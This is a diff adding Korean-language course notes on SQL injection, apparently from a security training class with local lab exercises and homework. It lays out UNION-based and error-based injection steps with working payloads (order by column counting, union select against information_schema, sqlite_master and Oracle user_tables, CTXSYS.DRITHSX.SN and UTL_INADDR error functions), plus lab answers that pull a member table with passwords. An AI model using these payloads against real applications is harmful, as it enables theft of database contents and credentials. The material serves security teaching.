@@ -1,0 +1,233 @@
+select 우편번호, 시, 구.... from ZIPCODE
+where 동 like '%___검색어___%';
+
+user = 현재 로그인 계정
+version
+
+UNION 앞 뒤의 SELECT 문의 컬럼의 개수가 같고 (자료형이 같을 때)
+
+1. 인젝션 공격이 가능한 곳 찾기
+ -> '
+2. 쿼리문을 유추 
+3. 현재 쿼리의 컬럼의 개수
+  order by 1~.... 에러가 날 때까지 -> 에러가 안나는 최대 수=컬럼 수
+  select null,....
+(4. 컬럼의 자료형) -> 문자형 타입
+  union select 1, 2, 'a',..... from dual
+ 5. 테이블명 = table_name
+  select table_name from user_tables;
+  select 0,0,table_name,... from user_tables;
+ 6. 컬럼명
+  select 0,0,column_name,.. from all_tab_columns where table_name = "위에서탈취한테이블명";
+ 7. 데이터 탈취 
+  select 0,0,위에서탈취한컬럼명,.... from 위에서탈취한테이블명
+
+
+* PHP 문제 12번 -> ASP 문제 12번 -> union.zip : 관리자의 아이디, 비밀번호 
+  -> Bonus! 주석없이 PHP 12번 -> Bonus2! 주석없이 order by 쓰기
+
+   MySQL(MariaDB)    MSSQL Server     SQLite3
+   다른 DB 테스트 : SQLFiddle, SQLTest
+                                                 - 명령 프롬프트
+1. 공격에 사용한 쿼리문 순서대로                   > cd [압축푼 폴더]
+ ex)                                               > pip install flask
+ 1) 컬럼 수                                        > py union.py
+   삼성동%' order by 8...                        - 브라우저  
+ 2) 테이블                                          http://localhost:5000
+ ...
+ ..
+
+2. 정답
+
+DM으로 보내주세요~
+
+
+1. 인젝션 공격 가능 포인트 찾기
+
+2. 쿼리문 유추
+select 컬럼1, 컬럼2~컬럼5 from 주소
+where 읍면동 like '%__검색어__%'
+
+3. 현재 화면 쿼리의 컬럼 개수 : 5개
+삼성동%' order by 1 #
+
+4. 자료형 X -> Mysql, Mariadb
+UNION 할 때 자료형이 관계 없다.
+삼성동%' union select null, null, null, null#
+
+5. 테이블명 : union_answer
+select table_name from information_schema.tables;
+
+삼성동%' union select table_name,0,0,0,0 from information_schema.tables where table_schema = database()#
+
+
+삼성동%' union select table_name,0,0,0,0 from information_schema.tables#
+
+5. 컬럼명 : answer_column
+삼성동%' union select column_name,0,0,0,0 from information_schema.columns where table_name = 'union_answer'#
+
+6. 데이터 추출 : this_is_answer_answer
+select answer_column from union_answer
+삼성동%' union select answer_column,0,0,0,0 from union_answer#
+
+1. 컬럼의 개수 : 5개
+멍order by
+
+select 컬럼1~.. from profile
+where name like '% ___검색어___ %'
+
+멍멍일%' order by 1 --
+
+2. 자료형 무관
+멍멍일%' union select null, null, null, null, null --
+
+3. 테이블 명 : member
+멍멍일%' union select * from sqlite_master--
+
+4. 컬럼 : idx, id, name, password
+멍멍일%' union select idx, id, name, password, 0 from member--
+
+
+
+select 컬럼1~? from 주소
+where 읍면동 like '%__검색어__%'
+
+삼성동%' order by 1~? --
+
+select 컬럼1~? from 주소
+where 읍면동 like '%삼성동%' order by 1,'1%'='1 %';
+
+%삼성동%' order by 1,'
+
+삼성동%' union select null, null, null, null, null 
+
+
+select 컬럼1~? from 주소
+where 읍면동 like '%  삼성동%' union select null, null, null, null, null where '1%'=1%'
+
+검색어 : 삼성동%' union select null, null, null, null, null where '1%'=1
+
+
+* Error-based SQL Injection
+
+-- Oracle --
+CTXSYS.DRITHSX.SN(user, (__공격쿼리__))
+
+
+1. SQL Injection 공격이 가능한 포인트 -> DB 에러메시지가 노출이 되는 부분
+2. 현재 기능의 쿼리를 유추
+3. 테이블명 탈취
+    select table_name from user_tables;    
+
+  3-1) 테이블의 개수
+    select count(table_name) from user_tables;    
+
+  3-2) 테이블을 1 row씩 가져오기
+    select table_name from (select table_name, rownum as ln from user_tables)
+    where ln = 1 ~ 위에서 구한 count
+
+4. 컬럼명 탈취
+    select column_name from all_tab_columns where table_name = '탈취한Table'
+
+  4-1) 탈취한 Table 의 컬럼의 개수
+    select count(column_name) from all_tab_columns where table_name = '탈취한Table'
+
+  4-2) 컬럼을 1 row 씩 가져오기
+    select column_name from (select column_name, rownum as ln from all_tab_columns where table_name = '탈취한Table') where ln = 1 ~ 위에서 구한 컬럼 count
+
+5. 데이터를 탈취
+    select 탈취column from 탈취table
+   5-1) 데이터의 개수
+    select count(탈취colunn) from 탈취table
+   5-2) 데이터를 1 row씩
+    select 탈취column1 from (select 탈취column1, rownum ln from 탈취table)
+     where ln = 1 ~ 데이터의 count
+
+
+CTXSYS.DRITHSX.SN(user, (__공격쿼리__))
+
+
+1. 공격 포인트
+2. 쿼리 유추
+SELECT 컬럼1~? from 게시판 where 제목 like '%ee%' and 1=CTXSYS.DRITHSX.SN(user, (__공격쿼리__)) and '1%'='1%';
+
+공격 검색어 : ee%' and 1=CTXSYS.DRITHSX.SN(user, (__공격쿼리__)) and '1%'='1
+
+select 'hacker' from dual
+ee%' and 1=CTXSYS.DRITHSX.SN(user, (select 'hacker' from dual)) and '1%'='1
+
+select table_name from user_tables
+1) 개수 : 6개
+select count(table_name) from user_tables
+2) 한 row씩 
+select table_name from (select table_name, rownum as ln from user_tables) where ln = 1
+
+
+* JSP 문제 8번 -> PHP 문제 8번
+HINT : select table_name from information_schema.tables where table_schema = database()
+       한 row 씩 가져오는건 limit 0 ~ count-1, 1
+1. 공격 과정 쿼리
+2. 정답
+DM 으로 보내주세요.
+
+* PHP 푸신분들 추가 문제
+
+JSP 문제 8번에서 공격에 흔히 사용하는 
+
+UTL_INADDR.GET_HOST_NAME((서브쿼리))
+UTL_INADDR.GET_HOST_ADDRESS((서브쿼리)) 
+ORDSYS.ORD_DICOM.GETMAPPINGXPATH((서브쿼리), user, user)
+CTXSYS.DRITHSX.SN(user, (서브쿼리))
+
+이것들 제외하고 다른걸로 현재 로그인한 유저 계정을 찾으세요.
+
+
+
+SQL Injection
+
+개발자가 만든 쿼리 내에 내가 입력한게 그대로 들어가서 쿼리처럼 작동시키는 공격
+
+select * from table where column = ''
+
+1. 인증 우회
+And, Or 참거짓 우선순위
+인증 분리를 해서 비교 -> 아이디로 DB 비밀번호 가져와서 입력한거 해쉬화 한 값이랑 비교
+
+2. UNION SQL Injection
+-> 가장 많은 데이터를 한꺼번에 탈취할 수 있는 공격 방법
+여러개의 컬럼, 여러개의 Row 한번에 조회 가능
+
+3. Error-based SQL Injection
+-> 데이터 1개씩 탈취할 수 있는 공격방법
+1개의 컬럼, 1개의 Row를 조회 -> 데이터 범위를 줄이기 1 row씩 Query
+
+Oracle rownum <- Sub Query
+MySQL limit <- 
+
+4. Blind SQL Injection
+-> 데이터의 1글자씩 탈취할 수 있는 공격방법
+1개의 컬럼, 1개의 Row, 1개의 글자씩 -> 1row씩 Query -> 1 글자씩 Query
+
+
+- 공격 순서
+1) SQL Injection 공격 가능한 포인트 찾기
+2) 현재 기능의 Query 를 유추 <-
+ * Union 
+ 2-1) 현재 Query의 컬럼의 개 수
+ 2-2) 현재 Query의 컬럼들의 자료형
+3) 테이블 명
+ * Error-based
+ 3-1) 테이블의 개수
+ 3-2) 테이블을 1 row 씩
+    * Blind
+     3-2-1) 1 row의 테이블 명의 문자열 개수(길이)
+     3-2-2) 1 row의 테이블 명의 문자를 한개씩 쪼개서 첫번째~개수
+4) 컬럼 명
+ 4-1) 컬럼의 개수
+ 4-2) 컬럼을 1 row 씩
+5) 데이터
+ 5-1) 데이터의 개수
+ 5-2) 데이터을 1 row 씩
+
+* Session/Cookie
+* HTML, Javascript
